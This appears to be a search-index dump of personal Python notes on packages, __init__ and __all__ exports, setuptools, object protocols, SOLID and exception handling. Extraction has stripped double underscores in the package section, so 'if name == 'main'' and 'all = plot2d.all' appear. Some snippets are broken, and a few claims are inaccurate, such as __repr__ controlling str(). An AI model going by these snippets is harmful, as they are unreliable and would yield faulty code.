import graphics.primitive.fill would first execute the init.py file in the graphics/ directory followed by the init.py file in the primitive/ directory.</p> <p>Astute Python users might observe that a package still seems to work if init.py files are omitted. This is true\u2014you can use a directory of Python code as a package even if it contains no init.py. However, what\u2019s not obvious is that a directory with a missing init.py file actually defines a different kind of package known as namespace package. This is an advanced feature sometimes used by very large libraries and frameworks to implement broken plugin systems. In the opinion of the author, this is rarely what you want\u2014you should always create proper init.py files when creating a package. runninc packgage submodule as script</p> <p>from ..primitive import lines, text</p> <p>class Plot2D:     ...</p> <p>if name == 'main':     print('Testing Plot2D')     p = Plot2D()     ... If you try to run it directly, you get a crash complaining about relative import statements:</p> <p>Click here to view code image</p> <p>bash $ python3 graphics/graph2d/plot2d.py Traceback (most recent call last):   File 'graphics/graph2d/plot2d.py', line 1, in      from ..primitive import line, text ValueError: attempted relative import beyond top-level package bash $ You can\u2019t move into the package directory and run it there either: <p>Click here to view code image</p> <p>bash $ cd graphics/graph2d/ bash $ python3 plot2d.py Traceback (most recent call last):   File 'plot2d.py', line 1, in      from ..primitive import line, text ValueError: attempted relative import beyond top-level package bash $ <p>bash $ python3 -m graphics.graph2d.plot2d Testing Plot2D bash $ -m specifies a module or package as the main program. Python will run the module with the proper environment to make sure that imports work. Many of Python\u2019s built-in packages have \u201csecret\u201d features that can be used via -m. One of the most well-known is using python3 -m http.server to run a web server from the current directory.</p> <p>You can provide similar functionality with your own packages. If the name supplied to python -m name corresponds to a package directory, Python looks for the presence of a main.py in that directory and runs that as the scrip control package namespace</p> <p>The primary purpose of a package is to serve as a top-level container for code. Sometimes users will import the top-level name and nothing else. For example:</p> <p>import graphics This import doesn\u2019t specify any particular submodule. Nor does it make any other part of the package accessible. For example, you\u2019ll find that code like this fails:</p> <p>Click here to view code image</p> <p>import graphics graphics.primitive.fill.floodfill(img,x,y,color) # Fails! When only a top-level package import is given, the only file that imports is the associated init.py file. In this example, it\u2019s the file graphics/init.py file.</p> <p>The primary purpose of an init.py file is to build and/or manage the contents of the top-level package namespace. Often, this involves importing selected functions, classes, and other objects from lower-level submodules. For example, if the graphics package in this example consists of hundreds of low-level functions but most of those details are encapsulated into a handful of high-level classes, then the init.py file might choose to expose just those classes:</p> <p>Click here to view code image graphics/init.py</p> <p>from .graph2d.plot2d import Plot2D from .graph3d.plot3d import Plot3D With this init.py file, the names Plot2D and Plot3D would appear at the top level of the package. A user could then use those names as if graphics were a simple module:</p> <p>Click here to view code image</p> <p>from graphics import Plot2D plt = Plot2D(100, 100) plt.clear() ... This is often much more convenient for the user because they don\u2019t have to know how you\u2019ve actually organized your code. In some sense, you\u2019re putting a higher layer of abstraction on top of your code structure. Many of the modules in the Python standard library are constructed in this manner. For example, the popular collections module is actually a package. The collections/init.py file consolidates definitions from a few different places and presents them to the user as a single consolidated namespace. package exports</p> <p>One issue concerns the interaction between an init.py file and low-level submodules. For example, the user of a package might only want to concern themselves with objects and functions that live in the top-level package namespace. However, the implementor of a package might be concerned with the problem of organizing code into maintainable submodules.</p> <p>To better manage this organizational complexity, package submodules often declare an explicit list of exports by defining an all variable. This is a list of names that should be pushed up one level in the package namespace. For example:</p> <p>Click here to view code image</p>"},{"location":"python/modules/modules/#graphicsgraph2dplot2dpy","title":"graphics/graph2d/plot2d.py","text":"<p>all = ['Plot2D']</p> <p>class Plot2D:     ... The associated init.py file then imports its submodules using an * import like this:</p> <p>Click here to view code image</p>"},{"location":"python/modules/modules/#graphicsgraph2dinitpy","title":"graphics/graph2d/init.py","text":""},{"location":"python/modules/modules/#only-loads-names-explicitly-listed-in-all-variables","title":"Only loads names explicitly listed in all variables","text":"<p>from .plot2d import *</p>"},{"location":"python/modules/modules/#propagate-the-all-up-to-next-level-if-desired","title":"Propagate the all up to next level (if desired)","text":"<p>all = plot2d.all This lifting process then continues all the way to the top-level package init.py. for example:</p> <p>Click here to view code image</p>"},{"location":"python/modules/modules/#graphicsinitpy","title":"graphics/init.py","text":"<p>from .graph2d import * from .graph3d import *</p>"},{"location":"python/modules/modules/#consolidate-exports","title":"Consolidate exports","text":"<p>all = [     graph2d.all,     graph3d.all ]</p> <p>The gist is that every component of a package explicitly states its exports using the all variable. The init.py files then propagate the exports upwards. In practice, it can get complicated, but this approach avoids the problem of hard-wiring specific export names into the init.py file. Instead, if a submodule wants to export something, its name gets listed in just one place\u2014the all variable. Then, by magic, it propagates up to its proper place in the package namespace.</p> <p>It is worth noting that although using * imports in user code is frowned upon, it is widespread practice in package init.py files. The reason it works in packages is that it is usually much more controlled and contained\u2014being driven by the contents of the all variables and not a free-wheeling attitude of \u201clet\u2019s just import everything.\u201d module objects</p> <p>name</p> <p>Full module name</p> <p>doc</p> <p>Documentation string</p> <p>dict</p> <p>Module dictionary</p> <p>file</p> <p>Filename where defined</p> <p>package</p> <p>Name of enclosing package (if any)</p> <p>path</p> <p>List of subdirectories to search for submodules of a package.</p> <p>annotations</p> <p>Module-level type hints</p> <p>8.16 Deploying Python Packages The final frontier of modules and packages is the problem of giving your code to others. This is a large topic that has been the focus of active ongoing development over many years. I won\u2019t try to document a process that\u2019s bound to be out-of-date by the time you read this. Instead, direct your attention to the documentation at https://packaging.python.org/tutorials/packaging-projects.</p> <p>For the purposes of day-to-day development, the most important thing is to keep your code isolated as a self-contained project. All of your code should live in a proper package. Try to give your package a unique name so that it doesn\u2019t conflict with other possible dependencies. Consult the Python package index at https://pypi.org to pick a name. In structuring your code, try to keep things simple. As you\u2019ve seen, there are many highly sophisticated things that can be done with the module and package system. There is a time and place for that, but it should not be your starting point.</p> <p>With absolute simplicity in mind, the most minimalistic way to distribute pure Python code is to use the setuptools module or the built-in distutils module. Suppose you have written some code and it\u2019s in a project that looks like this:</p> <p>Click here to view code image</p> <p>spam-project/ README.txt Documentation.txt spam/ # A package of code init.py foo.py bar.py runspam.py # A script to run as: python runspam.py To create a distribution, create a file setup.py in the topmost directory (spam-project/ in this example). In this file, put the following code:</p> <p>Click here to view code image setup.py</p> <p>from setuptools import setup</p> <p>setup(name = 'spam', version = '0.0' packages = ['spam'], scripts = ['runspam.py'], ) In the setup() call, packages is a list of all package directories, and scripts is a list of script files. Any of these arguments may be omitted if your software does not have them (for example, if there are no scripts). name is the name of your package, and version is the version number as a string. The call to setup() supports a variety of other parameters that supply various metadata about your package. See the full list at https://docs.python.org/3/distutils/apiref.html.</p> <p>Creating a setup.py file is enough to create a source distribution of your software. Type the following shell command to make a source distribution:</p> <p>Click here to view code image</p> <p>bash $ python setup.py sdist ... bash $ This creates an archive file, such as spam-1.0.tar.gz or spam-1.0.zip, in the directory spam/dist. This is the file you would give to others to install your software. To install, a user can use a command such as pip. For example:</p> <p>Click here to view code image</p> <p>shell $ python3 -m pip install spam-1.0.tar.gz This installs the software into the local Python distribution and makes it available for general use. The code will normally be installed into a directory called site-packages in the Python library. To find the exact location of this directory, inspect the value of sys.path. Scripts are normally installed into the same directory as the Python interpreter itself.</p> <p>If the first line of a script starts with #! and contains the text python, the installer will rewrite the line to point to the local installation of Python. Thus, if your scripts have been hardcoded to a specific Python location, such as /usr/local/bin/python, they should still work when installed on other systems where Python is in a different location.</p> <p>It must be stressed that the use of setuptools as described here is absolutely minimal. Larger projects may involve C/C++ extensions, complicated package structures, examples, and more. Covering all of the tools and possible ways to deploy such code is beyond the scope of this book. You should consult various resources on https://python.org and https://pypi.org for the most up-to-date advice.</p> <p>8.17 The Penultimate Word: Start with a Package When first starting a new program, it is easy to start with a simple single Python file. For example, you might write a script called program.py and start with that. Although this will work fine for throwaway programs and short tasks, your \u201cscript\u201d may start growing and adding features. Eventually, you might want to split it into multiple files. It\u2019s at that point that problems often arise.</p> <p>In light of this, it makes sense to get in the habit of starting all programs as a package from the onset. For example, instead of making a file called program.py, you should make a program package directory called program:</p> <p>program/ init.py main.py Put your starting code in main.py and run your program using a command such as python -m program. As you need more code, add new files to your package and use package-relative imports. An advantage of using a package is that all of your code remains isolated. You can name the files whatever you want and not worry about collisions with other packages, standard library modules, or code written by your coworkers. Although setting up a package requires a bit more work at the start, it will likely save you a lot of headaches later.</p> <p>8.18 The Final Word: Keep It Simple There is a lot of more advanced wizardry associated with the module and package system than what has been shown here. Consult the tutorial \u201cModules and Packages: Live and Let Die!\u201d at https://dabeaz.com/modulepackage/index.html to get an idea of what\u2019s possible.</p> <p>All things considered, however, you\u2019re probably better off not doing any advanced module hacking. Managing modules, packages, and software distribution has always been a source of pain in the Python community. Much of the pain is a direct consequence of people applying hacks to the module system. Don\u2019t do that. Keep it simple and find the power to just say \u201cno\u201d when your coworkers propose to modify import to work with the blockchain.</p>"},{"location":"python/structure/","title":"Overview","text":""},{"location":"python/structure/#what-is-an-object","title":"What is an Object","text":"<p>Every piece of data stored in a program is an object. Each object has an identity, a type (also known as its class), and a value. For example, when you write <code>a = 42</code>, an integer object is created with the value of 42. The identity of the object is a number representing its location in memory, and <code>a</code> is a label that refers to this specific location. The type of an object defines its internal data representation and supported methods. An object can be mutable or immutable, and it can hold references to other objects.</p> <p>Objects are characterized by their attributes, which are accessed using the dot operator (<code>.</code>). An attribute can be a simple data value or a function called a method. Inheritance allows the creation of subtype objects that inherit features from the original type and can have additional or redefined methods.</p> <p>Type checks in a program may not always be useful due to performance impact and complex object hierarchies. For example, the <code>isinstance(items, list)</code> statement may not work for objects that have a list-like interface but don't directly inherit from the built-in list type.</p>"},{"location":"python/structure/#first-class-object","title":"First-Class Object","text":"<p>All objects in Python are considered first-class objects. This means they can be assigned to names, stored as variables, passed as arguments, returned from functions, compared with other objects, and more. They can be treated as data and manipulated in various ways.</p>"},{"location":"python/structure/#reference-counting-and-garbage-collection","title":"Reference Counting and Garbage Collection","text":"<p>Python manages objects through automatic garbage collection. Objects are reference-counted, meaning their reference count increases when they are assigned to names or placed in data structures. The reference count decreases when references go out of scope, are reassigned, or deleted. When an object's reference count reaches zero, it is garbage-collected.</p> <p>In some cases, circular dependencies among objects can lead to delayed destruction. The cyclic garbage collector detects and deletes these inaccessible objects periodically. Manual deletion of objects may be necessary in certain situations, and the <code>gc</code> module provides functions to control the garbage collection process.</p>"},{"location":"python/structure/#object-protocol","title":"Object Protocol","text":"<p>Python's behavior is determined by dynamic processes involving special methods known as \"magic\" methods. These methods are automatically triggered by the interpreter during program execution. Special methods are denoted by double underscores (<code>__</code>) before and after the method name.</p> <p>Different categories of objects have associated special methods called \"protocols.\" For example, container objects define methods like <code>__len__()</code>, <code>__getitem__()</code>, <code>__setitem__()</code>, and <code>__delitem__()</code> to implement container operations such as indexing and slicing. Iterators implement the <code>__iter__()</code> and <code>__next__()</code> methods to enable iteration.</p> <p>Other protocols include class attribute protocol, function protocol, context manager protocol, repr and doc protocol, and spread with <code>*</code>.</p>"},{"location":"python/structure/#container-protocols","title":"Container Protocols","text":"<p>Container objects implement various special methods to support container operations:</p> <pre><code>a = [1, 2, 3, 4, 5, 6]\nlen(a)               # a.__len__()\nx = a[2]             # x = a.__getitem__(2)\na[1] = 7             # a.__setitem__(1,7)\ndel a[2]             # a.__delitem__(2)\n5 in a               # a.__contains__(5)\n</code></pre> <p>Slicing operations are implemented using <code>__getitem__()</code>, <code>__setitem__()</code>, and <code>__delitem__()</code> methods. Slices are represented by special slice instances.</p>"},{"location":"python/structure/#iterator-protocol","title":"Iterator Protocol","text":"<p>Objects that support iteration implement the iterator protocol:</p> <pre><code>obj = iter(iterable)  # obj = iterable.__iter__()\nnext(obj)             # obj.__next__()\n</code></pre> <p>The <code>iter()</code> method returns an iterator object, which has a <code>__next__()</code> method to retrieve the next object in the iteration. The <code>for</code> statement implicitly performs iteration using these methods.</p>"},{"location":"python/structure/#class-attribute-protocol","title":"Class Attribute Protocol","text":"<p>Objects define class attribute methods for accessing, setting, and deleting attributes:</p> <pre><code>obj.__getattribute__(self, name)    # Returns the attribute self.name\nobj.__getattr__(self, name)         # Returns the attribute self.name (if not found through __getattribute__())\nobj.__setattr__(self, name, value)  # Sets the attribute self.name = value\nobj.__delattr__(self, name)         # Deletes the attribute self.name\n</code></pre>"},{"location":"python/structure/#function-protocol","title":"Function Protocol","text":"<p>Objects can emulate functions by implementing the <code>__call__()</code> method. When an object provides this method, it can be invoked like a function:</p> <pre><code>obj(arg1, arg2, ...)  # obj.__call__(arg1, arg2, ...)\n</code></pre> <p>Many built-in types and libraries support function calls by implementing <code>__call__()</code>.</p>"},{"location":"python/structure/#context-manager-protocol","title":"Context Manager Protocol","text":"<p>Context managers define the methods <code>__enter__()</code> and <code>__exit__()</code> (or <code>__aenter__()</code> and <code>__aexit__</code> for async context managers). These methods are used for resource management and provide a convenient way to set up and clean up resources within a block of code.</p>"},{"location":"python/structure/#repr-and-doc","title":"Repr and Doc","text":"<p>Objects can define the <code>__repr__()</code> method to control how they are represented when using <code>print()</code> or <code>str()</code>. The <code>__doc__</code> attribute stores docstrings associated with the object.</p>"},{"location":"python/structure/#spread-with","title":"Spread with *","text":"<p>The <code>*</code> operator can be used to pass sequences or mappings as arguments to functions:</p> <pre><code>def func(x, y, z):\n    ...\n\ns = (1, 2, 3)\nresult = func(*s)  # Pass a sequence as arguments\n\nd = { 'x': 1, 'y': 2, 'z': 3 }\nresult = func(**d)  # Pass a mapping as keyword arguments\n</code></pre>"},{"location":"python/structure/code_design/","title":"Code Design","text":""},{"location":"python/structure/code_design/#design-by-contract","title":"Design by Contract","text":"<p>Design by Contract is a programming approach that focuses on enforcing rules and constraints during the communication of software components. It involves the use of contracts that define preconditions, postconditions, invariants, and side effects.</p> <ul> <li>Preconditions: Checks performed before running a function to ensure that the requirements are met.</li> <li>Postconditions: Checks performed after the execution of a function to validate if the expected result is achieved.</li> <li>Invariants: Rules or constraints that remain true throughout the execution of the code.</li> <li>Side Effects: Mentioned in the code, they describe any changes or actions that occur beyond the return value of a function.</li> </ul>"},{"location":"python/structure/code_design/#defensive-programming","title":"Defensive Programming","text":"<p>Defensive programming involves writing code that protects itself from invalid inputs or unexpected behavior. It includes error handling techniques such as:</p> <ul> <li>Value substitution: Using default values or environment variables (<code>os.getenv(\"DPORT\", 5432)</code>).</li> <li>Error logging: Capturing and logging errors for debugging and analysis.</li> <li>Exception handling: Properly handling exceptions with well-defined scopes to reduce the impact of errors.</li> </ul> <p>Best practices for error handling include avoiding traceback to end users, avoiding empty <code>except</code> blocks, and including the original exception for better debugging.</p>"},{"location":"python/structure/code_design/#cohesion-and-coupling","title":"Cohesion and Coupling","text":"<p>Cohesion and coupling are concepts related to how objects or components in a codebase depend on each other.</p> <ul> <li>Cohesion: Describes the degree to which a component or class focuses on a single responsibility or functionality. High cohesion means that a component is focused and has a clear purpose.</li> <li>Coupling: Refers to the interdependence between components or classes. High coupling indicates tight dependencies, which can lead to issues such as limited code reuse, ripple effects of changes, and a low level of abstraction.</li> </ul>"},{"location":"python/structure/code_design/#dry-and-oaoo","title":"DRY and OAOO","text":"<p>DRY (Don't Repeat Yourself) and OAOO (Once and Only Once) are principles that promote code efficiency and maintainability.</p> <ul> <li>DRY: Encourages avoiding code duplication by abstracting common functionality into reusable components or functions.</li> <li>OAOO: Advocates for implementing a particular behavior or logic in a single place to ensure consistency and reduce the chance of introducing errors through duplicated code.</li> </ul>"},{"location":"python/structure/code_design/#yagni-and-kis","title":"YAGNI and KIS","text":"<ul> <li>YAGNI: Stands for \"You Ain't Gonna Need It.\" It advises developers to avoid over-engineering or adding unnecessary features to their codebase. Only implement what is needed at the present moment to avoid complexity and potential issues.</li> <li>KIS: Stands for \"Keep It Simple.\" It emphasizes simplicity in design and implementation. When designing a software component, aim for the minimal solution that effectively solves the problem without introducing unnecessary complexity.</li> </ul>"},{"location":"python/structure/code_design/#eafp-and-lbyl","title":"EAFP and LBYL","text":"<ul> <li>EAFP: Stands for \"Easier to Ask Forgiveness than Permission.\" This programming approach suggests trying an operation and handling any resulting exceptions rather than checking for preconditions or permissions before executing the operation.</li> <li>LBYL: Stands for \"Look Before You Leap.\" It involves checking preconditions or permissions before executing an operation to avoid exceptions or errors. An example is checking if a file exists before attempting to open it.</li> </ul> <p>Example:</p>"},{"location":"python/structure/code_design/#eafp","title":"EAFP","text":"<pre><code>try:\n    with open(filename) as f:\n        # Code for file processing\nexcept FileNotFoundError as e:\n    logger.error(e)\n</code></pre>"},{"location":"python/structure/code_design/#lbyl","title":"LBYL","text":"<pre><code>if os.path.exists(filename):\n    with open(filename) as f:\n        # Code for file processing\n</code></pre>"},{"location":"python/structure/practices/","title":"Practices","text":""},{"location":"python/structure/practices/#bad","title":"BAD","text":"<ul> <li>try to not use global statement.</li> </ul>"},{"location":"python/structure/solid/","title":"SOLID Principles in Python with Examples","text":"<p>SOLID is an acronym representing five design principles intended to make software designs more understandable, flexible, and maintainable. Here's a brief overview and examples in Python for each principle.</p>"},{"location":"python/structure/solid/#1-single-responsibility-principle-srp","title":"1. Single Responsibility Principle (SRP)","text":"<p>A class should have only one reason to change, meaning it should have only one job.</p> <pre><code>class Order:\n    def __init__(self):\n        self.items = []\n        self.quantities = []\n        self.prices = []\n        self.status = \"open\"\n\n    def add_item(self, item, quantity, price):\n        self.items.append(item)\n        self.quantities.append(quantity)\n        self.prices.append(price)\n\n# SRP Violation: Adding order processing logic to Order class\n# Solution: Separate order processing into another class\nclass OrderProcessor:\n    def process_order(self, order):\n        if order.status == \"open\":\n            # Process the order\n            order.status = \"closed\"\n            print(\"Order processed.\")\n</code></pre>"},{"location":"python/structure/solid/#2-openclosed-principle-ocp","title":"2. Open/Closed Principle (OCP)","text":"<p>Software entities (classes, modules, functions, etc.) should be open for extension, but closed for modification.</p> <pre><code>class Discount:\n    def __init__(self, customer, price):\n        self.customer = customer\n        self.price = price\n\n    def give_discount(self):\n        if self.customer == \"fav\":\n            return self.price * 0.2\n        if self.customer == \"vip\":\n            return self.price * 0.4\n\n# OCP Violation: Modifying Discount class each time to add a new customer type\n# Solution: Extend Discount class without modifying it\nclass VIPDiscount(Discount):\n    def give_discount(self):\n        return super().give_discount() * 1.2\n</code></pre>"},{"location":"python/structure/solid/#3-liskov-substitution-principle-lsp","title":"3. Liskov Substitution Principle (LSP)","text":"<p>Objects of a superclass shall be replaceable with objects of its subclasses without affecting the correctness of the program.</p> <pre><code>class Bird:\n    def fly(self):\n        pass\n\nclass Duck(Bird):\n    def fly(self):\n        print(\"Duck flying\")\n\nclass Ostrich(Bird):\n    def fly(self):\n        raise NotImplementedError(\"Ostrich cannot fly\")\n\n# LSP Violation: Ostrich is a Bird but cannot fly\n# Solution: Introduce a new class hierarchy\nclass FlyingBird(Bird):\n    def fly(self):\n        pass\n\nclass NonFlyingBird(Bird):\n    pass\n</code></pre>"},{"location":"python/structure/solid/#4-interface-segregation-principle-isp","title":"4. Interface Segregation Principle (ISP)","text":"<p>No client should be forced to depend on methods it does not use.</p> <pre><code>from abc import ABC, abstractmethod\n\nclass Machine(ABC):\n    @abstractmethod\n    def print(self):\n        pass\n\n    @abstractmethod\n    def scan(self):\n        pass\n\n# ISP Violation: A simple printer class forced to implement scan method\n# Solution: Split the interface\nclass Printer(ABC):\n    @abstractmethod\n    def print(self):\n        pass\n\nclass Scanner(ABC):\n    @abstractmethod\n    def scan(self):\n        pass\n</code></pre>"},{"location":"python/structure/solid/#5-dependency-inversion-principle-dip","title":"5. Dependency Inversion Principle (DIP)","text":"<p>High-level modules should not depend on low-level modules. Both should depend on abstractions. Moreover, abstractions should not depend on details. Details should depend on abstractions.</p> <pre><code>from abc import ABC, abstractmethod\n\nclass Button:\n    def __init__(self, lamp):\n        self.lamp = lamp\n\n    def toggle(self):\n        if self.lamp.is_on():\n            self.lamp.turn_off()\n        else:\n            self.lamp.turn_on()\n\n# DIP Violation: Button class directly depends on a specific Lamp class\n# Solution: Use an interface to invert the dependency\nclass Switchable(ABC):\n    @abstractmethod\n    def turn_on(self):\n        pass\n\n    @abstractmethod\n    def turn_off(self):\n        pass\n</code></pre> <p>By adhering to these principles, developers can create more maintainable, scalable, and robust systems.</p>"},{"location":"python/structure/structure/","title":"Structure","text":""},{"location":"python/structure/structure/#memorize-some-tips","title":"Memorize Some Tips","text":""},{"location":"python/structure/structure/#literals","title":"Literals","text":"<p>Literals are used to represent fixed values in Python. Here are some examples:</p> <ul> <li>Integer literals: <code>42</code>, <code>0b101010</code> (binary), <code>0o52</code> (octal), <code>0x2a</code> (hexadecimal)</li> <li>Numeric literals can also include underscores for readability: <code>123_456_789</code>, <code>0x1234_5678</code>, <code>0b111_00_101</code>, <code>123.789_012</code></li> </ul>"},{"location":"python/structure/structure/#operations-for-iterables","title":"Operations for Iterables","text":"<ul> <li>Iteration: <code>for vars in s:</code></li> <li>Variable unpacking: <code>v1, v2, ... = s</code></li> <li>Membership: <code>x in s</code>, <code>x not in s</code></li> <li>Expansion in list, tuple, or set literals: <code>[a, *s, b]</code>, <code>(a, *s, b)</code>, <code>{a, *s, b}</code></li> <li>Throw variable: <code>throw variable like that</code></li> <li>Example: <code>a,_,b=[1,2,3]</code></li> </ul>"},{"location":"python/structure/structure/#set-operations","title":"Set Operations","text":"<p>Set operations allow manipulating sets in Python:</p> <pre><code>names1 = { 'IBM', 'MSFT', 'AA' }\nnames2 = set(['IBM', 'MSFT', 'HPE', 'IBM', 'CAT'])\n\na = names1 | names2      # Union: {'IBM', 'MSFT', 'HPE', 'AA', 'CAT'}\nb = names1 &amp; names2      # Intersection: {'IBM', 'MSFT'}\nc = names1 - names2      # Difference: {'AA'}\nd = names2 - names1      # Difference: {'HPE', 'CAT'}\ne = names1 ^ names2      # Symmetric Difference: {'HPE', 'AA', 'CAT'}\n</code></pre>"},{"location":"python/structure/structure/#discard","title":"Discard()","text":"<p>The <code>discard()</code> method is used to remove an item from a set:</p> <pre><code>s.discard('SCOX')  # Remove 'SCOX' if it exists.\n</code></pre>"},{"location":"python/structure/structure/#dictionary-operations","title":"Dictionary Operations","text":"<p>Dictionaries offer various operations for manipulating key-value pairs:</p> <ul> <li>Get with default value: <code>p = prices.get('IBM', 0.0)</code></li> <li>Delete: <code>del prices['GOOG']</code></li> <li>Keys can be tuples: <code>prices[('IBM', '2015-02-03')] = 91.23</code></li> </ul>"},{"location":"python/structure/structure/#list-comprehension","title":"List Comprehension","text":"<p>List comprehension provides a concise way to create lists based on existing lists or other iterables:</p> <pre><code>[expression for item1 in iterable1 if condition1\n            for item2 in iterable2 if condition2\n            ...\n            for itemN in iterableN if conditionN]\n</code></pre> <p>This syntax is equivalent to the following code:</p> <pre><code>result = []\nfor item1 in iterable1:\n    if condition1:\n        for item2 in iterable2:\n            if condition2:\n                ...\n                for itemN in iterableN:\n                    if conditionN:\n                        result.append(expression)\n</code></pre>"},{"location":"python/structure/structure/#generator-expression","title":"Generator Expression","text":"<p>Generator expressions are used to create generator objects, which generate values on the fly without storing them in memory:</p> <pre><code>nums = [1, 2, 3, 4]\nsquares = (x*x for x in nums)\n\n&gt;&gt;&gt; squares\n&lt;generator object at 0x590a8&gt;\n&gt;&gt;&gt; next(squares)\n1\n&gt;&gt;&gt; next(squares)\n4\n</code></pre>"},{"location":"python/structure/structure/#python-enumerate","title":"Python Enumerate","text":"<p>The <code>enumerate()</code> function is used to iterate over a sequence while keeping track of the index:</p> <pre><code>for i, x in enumerate(s, start=100):\n    statements\n</code></pre>"},{"location":"python/structure/structure/#zip","title":"Zip","text":"<p>The <code>zip()</code> function is used to iterate over multiple sequences simultaneously:</p> <pre><code>for x, y in zip(s, t):\n    statements\n</code></pre> <p>The <code>zip()</code> function returns an iterable of tuples.</p>"},{"location":"python/structure/structure/#exception-base-roots","title":"Exception Base Roots","text":"<ul> <li><code>BaseException</code>: The root class for all exceptions.</li> <li><code>Exception</code>: Base class for all program-related errors.</li> <li><code>ArithmeticError</code>: Base class for all math-related errors.</li> <li><code>ImportError</code>: Base class for import-related errors.</li> <li><code>LookupError</code>: Base class for all container lookup errors.</li> <li><code>OSError</code>: Base class for all system-related errors. <code>IOError</code> and <code>EnvironmentError</code> are aliases.</li> <li><code>ValueError</code>: Base class for value-related errors, including Unicode-related errors.</li> <li><code>UnicodeError</code>: Base class for Unicode string encoding-related errors.</li> <li><code>AssertionError</code>: Raised when an <code>assert</code> statement fails.</li> <li><code>AttributeError</code>: Raised when a bad attribute lookup is performed on an object.</li> <li><code>EOFError</code>: Raised when the end of a file is reached.</li> <li><code>MemoryError</code>: Raised when a recoverable out-of-memory error occurs.</li> <li><code>NameError</code>: Raised when a name is not found in the local or global namespace.</li> <li><code>NotImplementedError</code>: Raised for an unimplemented feature.</li> <li><code>RuntimeError</code>: A generic \"something bad happened\" error.</li> <li><code>TypeError</code>: Raised when an operation is applied to an object of the wrong type.</li> <li><code>UnboundLocalError</code>: Raised when a local variable is used before a value is assigned.</li> <li><code>SystemExit</code>: Raised to indicate program exit.</li> <li><code>KeyboardInterrupt</code>: Raised when a program is interrupted via Control-C.</li> <li><code>StopIteration</code>: Raised to signal the end of iteration.</li> </ul>"},{"location":"python/structure/structure/#new-exception","title":"New Exception","text":"<p>You can create your own custom exceptions by defining a new class that inherits from the <code>Exception</code> class. Here's an example:</p> <pre><code>class NetworkError(Exception):\n    pass\n\nraise NetworkError('Cannot find host')\n</code></pre>"},{"location":"python/structure/structure/#chained-exception","title":"Chained Exception","text":"<p>You can raise a different exception while preserving the original exception using the <code>from</code> keyword. Here's an example:</p> <pre><code>try:\n    # Some code that may raise an exception\nexcept Exception as e:\n    raise ValueError('An error occurred') from e\n</code></pre> <p>This creates a new <code>ValueError</code> exception with the original exception <code>e</code> chained to it.</p> Exception Name Description BaseException The root class for all exceptions. Exception Base class for all program-related errors. ArithmeticError Base class for all math-related errors. ImportError Base class for import-related errors. LookupError Base class for all container lookup errors. OSError Base class for all system-related errors. ValueError Base class for value-related errors. UnicodeError Base class for Unicode string encoding errors. AssertionError Raised when an assert statement fails. AttributeError Raised when a bad attribute lookup is performed. EOFError Raised when the end of a file is reached. MemoryError Raised when a recoverable out-of-memory error occurs. NameError Raised when a name is not found in the local or global namespace. NotImplementedError Raised for an unimplemented feature. RuntimeError A generic \"something bad happened\" error. TypeError Raised when an operation is applied to an object of the wrong type. UnboundLocalError Raised when a local variable is used before a value is assigned. SystemExit Raised to indicate program exit. KeyboardInterrupt Raised when a program is interrupted via Control-C. StopIteration Raised to signal the end of iteration. <pre><code>class ApplicationError(Exception): pass\n\ndef do_something(): x = int('N/A') # raises ValueError\n\ndef spam(): try: do_something() except Exception as e: raise ApplicationError('It failed') from e\n\n## Exception handling advice\n</code></pre>"},{"location":"python/structure/structure/#eargs","title":"e.args","text":"<p>The tuple of arguments supplied when raising the exception. In most cases, this is a one-item tuple with a string describing the error. For OSError exceptions, the value is a 2-tuple or 3-tuple containing an integer error number, string error message, and an optional filename.</p>"},{"location":"python/structure/structure/#ecause","title":"e.cause","text":"<p>Previous exception if the exception was intentionally raised in response to handling another exception. See the later section on chained exceptions.</p>"},{"location":"python/structure/structure/#econtext","title":"e.context","text":"<p>Previous exception if the exception was raised while handling another exception.</p>"},{"location":"python/structure/structure/#etraceback","title":"e.traceback","text":"<p>Stack traceback object associated with the exception.</p> <pre><code>try:\n    # do something\nexcept (TypeError, ValueError) as e:\n    # Handle Type or Value errors\n</code></pre> <pre><code>try:\n    file = open('foo.txt', 'rt')\nexcept FileNotFoundError as e:\n    print(f'Unable to open foo: {e}')\n    data = ''\nelse:\n    data = file.read()\n    file.close()\n</code></pre> <pre><code>file = open('foo.txt', 'rt')\ntry:\n    # Do some stuff\n    ...\nfinally:\n    file.close()\n</code></pre> <p>Exception handling is one of the most difficult things to get right in larger programs. However, there are a few rules of thumb that make it easier.</p> <p>The first rule is to not catch exceptions that can\u2019t be handled at that specific location in the code. Consider a function like this:</p> <pre><code>def read_data(filename):\n    with open(filename, 'rt') as file:\n        rows = []\n        for line in file:\n            row = line.split()\n            rows.append((row[0], int(row[1]), float(row[2])))\n    return rows\n</code></pre> <p>Suppose the <code>open()</code> function fails due to a bad filename. Is this an error that should be caught with a try-except statement in this function? Probably not. If the caller gives a bad filename, there is no sensible way to recover. There is no file to open, no data to read, and nothing else that\u2019s possible. It\u2019s better to let the operation fail and report an exception back to the caller. Avoiding an error check in <code>read_data()</code> doesn\u2019t mean that the exception would never be handled anywhere\u2014it just means that it\u2019s not the role of <code>read_data()</code> to do it. Perhaps the code that prompted a user for a filename would handle this exception.</p> <p>This advice might seem contrary to the experience of programmers accustomed to languages that rely upon special error codes or wrapped result types. In those languages, great care is made to make sure you always check return codes for errors on all operations. You don\u2019t do this in Python. If an operation can fail and there\u2019s nothing you can do to recover, it\u2019s better to just let it fail. The exception will propagate to upper levels of the program where it is usually the responsibility of some other code to handle it.</p> <p>On the other hand, a function might be able to recover from bad data. For example:</p> <pre><code>def read_data(filename):\n    with open(filename, 'rt') as file:\n        rows = []\n        for line in file:\n            row = line.split()\n            try:\n                rows.append((row[0], int(row[1]), float(row[2])))\n            except ValueError as e:\n                print('Bad row:', row)\n                print('Reason:', e)\n    return rows\n</code></pre> <p>When catching errors, try to make your except clauses as narrow as reasonable. The above code could have been written to catch all errors by using <code>except Exception</code>. However, doing that would make the code catch legitimate programming errors that probably shouldn\u2019t be ignored. Don\u2019t do that\u2014it will make debugging difficult.</p> <p>Finally, if you\u2019re explicitly raising an exception, consider making your own exception types. For example:</p> <pre><code># Code Termination\n# exit code\n\n# can be used instead of exit()\n\nraise SystemExit()                      # Exit with no error message\nraise SystemExit(\"Something is wrong\")  # Exit with error\n</code></pre>"},{"location":"python/structure/structure/#exception-hierarchy","title":"Exception Hierarchy","text":"<ul> <li>BaseException</li> <li>SystemExit</li> <li>KeyboardInterrupt</li> <li>GeneratorExit</li> <li>Exception<ul> <li>StopIteration</li> <li>StopAsyncIteration</li> <li>ArithmeticError<ul> <li>FloatingPointError</li> <li>OverflowError</li> 